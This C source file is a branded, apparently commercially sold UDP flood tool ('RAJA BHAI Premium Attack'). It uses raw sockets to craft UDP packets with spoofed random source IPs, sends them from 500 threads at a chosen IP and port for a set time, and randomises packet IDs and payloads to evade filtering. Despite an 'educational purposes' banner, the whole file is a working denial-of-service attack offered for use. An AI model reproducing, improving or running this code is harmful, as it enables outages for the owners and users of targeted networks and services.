#define _XOPEN_SOURCE 700
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/types.h>
#include <sys/socket.h>

#define MAX_THREADS 500
#define PAYLOAD_SIZE 1024
#define EXPIRY_DATE "2095-12-31"

// RAJA BHAI branding colors
#define RED "\033[1;31m"
#define GREEN "\033[1;32m"
#define YELLOW "\033[1;33m"
#define BLUE "\033[1;34m"
#define MAGENTA "\033[1;35m"
#define CYAN "\033[1;36m"
#define RESET "\033[0m"

typedef struct {
    char ip[16];
    int port;
    int duration;
    int thread_id;
} AttackParams;

// Custom packet header structure
struct packet_header {
    struct iphdr ip;
    struct udphdr udp;
    char payload[PAYLOAD_SIZE];
};

// Function declarations
void print_banner();
int is_expired();
void generate_payload(char* payload, int size);
void* send_payload(void* arg);
unsigned short checksum(unsigned short *ptr, int nbytes);
void create_packet(struct packet_header *packet, const char* src_ip, const char* dst_ip, 
                   int src_port, int dst_port, const char* payload, int payload_size);

int main(int argc, char* argv[]) {
    print_banner();
    
    if (argc != 4) {
        printf(RED "\nUsage: %s <IP> <PORT> <DURATION>\n" RESET, argv[0]);
        printf(YELLOW "Example: %s 192.168.1.1 80 60\n\n" RESET, argv[0]);
        return 1;
    }

    if (is_expired()) {
        printf(RED "\nBUY NEW FROM @IPxKINGYT\n" RESET);
        printf(YELLOW "Contact for premium versions!\n\n" RESET);
        return 1;
    }

    AttackParams params;
    strcpy(params.ip, argv[1]);
    params.port = atoi(argv[2]);
    params.duration = atoi(argv[3]);

    printf(CYAN "\nūüöÄ Launching RAJA BHAI Premium Attack ūüöÄ\n" RESET);
    printf(MAGENTA "Target: %s:%d\n" RESET, params.ip, params.port);
    printf(MAGENTA "Duration: %d seconds\n" RESET, params.duration);
    printf(MAGENTA "Threads: %d\n" RESET, MAX_THREADS);
    printf(MAGENTA "Payload Size: %d bytes\n\n" RESET, PAYLOAD_SIZE);

    printf(YELLOW "Initializing threads..." RESET);
    fflush(stdout);

    pthread_t threads[MAX_THREADS];
    AttackParams thread_params[MAX_THREADS];

    for (int i = 0; i < MAX_THREADS; i++) {
        memcpy(&thread_params[i], &params, sizeof(AttackParams));
        thread_params[i].thread_id = i + 1;
        
        if (pthread_create(&threads[i], NULL, send_payload, &thread_params[i]) != 0) {
            perror("Thread creation failed");
        }
        
        // Show progress for large thread counts
        if (i % 50 == 0) {
            printf(YELLOW "." RESET);
            fflush(stdout);
        }
    }

    printf(GREEN " DONE!\n\n" RESET);
    printf(RED "ūüĒ• ATTACK IN PROGRESS - RAJA BHAI STYLE ūüĒ•\n" RESET);

    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf(GREEN "\n‚úÖ Attack completed successfully!\n" RESET);
    printf(CYAN "Target: %s:%d for %d seconds\n\n" RESET, params.ip, params.port, params.duration);
    printf(YELLOW "Thank you for using RAJA BHAI Premium Tools!\n" RESET);

    return 0;
}

void print_banner() {
    printf(RED "\n\n");
    printf("‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó‚ĖĎ‚Ėą‚Ėą‚ēó‚ĖĎ‚ĖĎ‚ĖĎ‚ĖĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó‚ĖĎ‚Ėą‚Ėą‚ēó‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēó\n");
    printf("‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚ĖĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĎ‚ĖĎ‚Ėą‚Ėą‚ēĒ‚ēĚ‚Ėą‚Ėą‚ēĎ\n");
    printf("‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēĒ‚ēĚ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚ĖĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēź‚ēĚ‚ĖĎ‚Ėą‚Ėą‚ēĎ\n");
    printf("‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚ĖĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĒ‚ēź‚Ėą‚Ėą‚ēó‚ĖĎ‚Ėą‚Ėą‚ēĎ\n");
    printf("‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó‚ēö‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēĒ‚ēĚ‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ēö‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĎ\n");
    printf("‚ēö‚ēź‚ēĚ‚ĖĎ‚ĖĎ‚ēö‚ēź‚ēĚ‚ēö‚ēź‚ēĚ‚ĖĎ‚ĖĎ‚ēö‚ēź‚ēĚ‚ēö‚ēź‚ēĚ‚ĖĎ‚ĖĎ‚ēö‚ēź‚ēĚ‚ēö‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēĚ‚ĖĎ‚ēö‚ēź‚ēź‚ēź‚ēź‚ēĚ‚ĖĎ‚ēö‚ēź‚ēĚ‚ĖĎ‚ĖĎ‚ēö‚ēź‚ēĚ‚ēö‚ēź‚ēĚ\n");
    printf(BLUE "‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó‚ĖĎ‚Ėą‚Ėą‚ēó‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēó‚ĖĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó‚ĖĎ‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚Ėą‚ēó‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēó‚ĖĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó‚ĖĎ‚Ėą‚Ėą‚ēó‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó\n");
    printf("‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚Ėą‚Ėą‚ēó‚ĖĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĎ‚ĖĎ‚Ėą‚Ėą‚ēĒ‚ēĚ‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚ēź‚ēź‚ēĚ\n");
    printf("‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēĒ‚ēĚ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĒ‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēź‚ēĚ‚ĖĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó‚ĖĎ‚ĖĎ\n");
    printf("‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚ēź‚ēĚ‚ĖĎ‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ‚ēö‚Ėą‚Ėą‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĒ‚ēź‚Ėą‚Ėą‚ēó‚ĖĎ‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚ēĚ‚ĖĎ‚ĖĎ\n");
    printf("‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚ĖĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ēö‚Ėą‚Ėą‚Ėą‚ēĎ‚ēö‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēĒ‚ēĚ‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ēö‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó\n");
    printf("‚ēö‚ēź‚ēĚ‚ĖĎ‚ĖĎ‚ĖĎ‚ĖĎ‚ĖĎ‚ēö‚ēź‚ēĚ‚ĖĎ‚ĖĎ‚ēö‚ēź‚ēĚ‚ēö‚ēź‚ēĚ‚ĖĎ‚ĖĎ‚ēö‚ēź‚ēĚ‚ēö‚ēź‚ēĚ‚ēö‚ēź‚ēĚ‚ĖĎ‚ĖĎ‚ēö‚ēź‚ēź‚ēĚ‚ĖĎ‚ēö‚ēź‚ēź‚ēź‚ēź‚ēĚ‚ĖĎ‚ēö‚ēź‚ēĚ‚ĖĎ‚ĖĎ‚ēö‚ēź‚ēĚ‚ēö‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēĚ\n");
    printf(RESET);
    printf(MAGENTA "ūüĒ• Premium UDP Flood Tool | By RAJA BHAI ūüĒ•\n");
    printf(CYAN "‚≠ź Exclusive Version | For Educational Purposes Only ‚≠ź\n\n" RESET);
}

int is_expired() {
    struct tm expiry_tm = {0};
    struct tm current_tm = {0};

    strptime(EXPIRY_DATE, "%Y-%m-%d", &expiry_tm);
    time_t now = time(NULL);
    localtime_r(&now, &current_tm);

    if (difftime(mktime(&current_tm), mktime(&expiry_tm)) > 0) {
        return 1;
    }
    return 0;
}

void generate_payload(char* payload, int size) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_-+={}[]|:;'<>,.?/";
    for (int i = 0; i < size - 1; i++) {
        payload[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    payload[size - 1] = '\0';
}

unsigned short checksum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char*)&oddbyte) = *(unsigned char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;
    
    return answer;
}

void create_packet(struct packet_header *packet, const char* src_ip, const char* dst_ip, 
                   int src_port, int dst_port, const char* payload, int payload_size) {
    // IP header
    packet->ip.ihl = 5;
    packet->ip.version = 4;
    packet->ip.tos = 0;
    packet->ip.tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size);
    packet->ip.id = htons(rand() % 65535);
    packet->ip.frag_off = 0;
    packet->ip.ttl = 255;
    packet->ip.protocol = IPPROTO_UDP;
    packet->ip.check = 0;
    packet->ip.saddr = inet_addr(src_ip);
    packet->ip.daddr = inet_addr(dst_ip);
    packet->ip.check = checksum((unsigned short*)&packet->ip, sizeof(struct iphdr));

    // UDP header
    packet->udp.source = htons(src_port);
    packet->udp.dest = htons(dst_port);
    packet->udp.len = htons(sizeof(struct udphdr) + payload_size);
    packet->udp.check = 0;

    // Payload
    memcpy(packet->payload, payload, payload_size);
}

void* send_payload(void* arg) {
    AttackParams* params = (AttackParams*)arg;
    int sock;
    struct sockaddr_in server_addr;
    char payload[PAYLOAD_SIZE];
    char source_ip[16];
    
    // Generate random source IP for each thread
    snprintf(source_ip, 16, "%d.%d.%d.%d", 
             rand() % 256, rand() % 256, rand() % 256, rand() % 256);
    
    // Generate random source port
    int source_port = 1024 + (rand() % 64512);
    
    // Generate powerful randomized payload
    generate_payload(payload, PAYLOAD_SIZE);
    
    // Create raw socket for more powerful attack
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("Raw socket creation failed");
        pthread_exit(NULL);
    }
    
    int one = 1;
    const int *val = &one;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("Setting IP_HDRINCL failed");
        close(sock);
        pthread_exit(NULL);
    }
    
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->port);
    server_addr.sin_addr.s_addr = inet_addr(params->ip);
    
    // Prepare packet
    struct packet_header packet;
    create_packet(&packet, source_ip, params->ip, source_port, params->port, payload, PAYLOAD_SIZE);
    
    time_t start_time = time(NULL);
    long packet_count = 0;
    
    while (time(NULL) - start_time < params->duration) {
        if (sendto(sock, &packet, sizeof(packet), 0, 
                  (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            continue;
        }
        packet_count++;
        
        // Update packet with new random values to avoid filtering
        if (packet_count % 100 == 0) {
            packet.ip.id = htons(rand() % 65535);
            generate_payload(payload, PAYLOAD_SIZE);
            memcpy(packet.payload, payload, PAYLOAD_SIZE);
        }
    }
    
    close(sock);
    
    printf(GREEN "[Thread %d] Sent %ld packets to %s:%d\n" RESET, 
           params->thread_id, packet_count, params->ip, params->port);
    
    pthread_exit(NULL);
}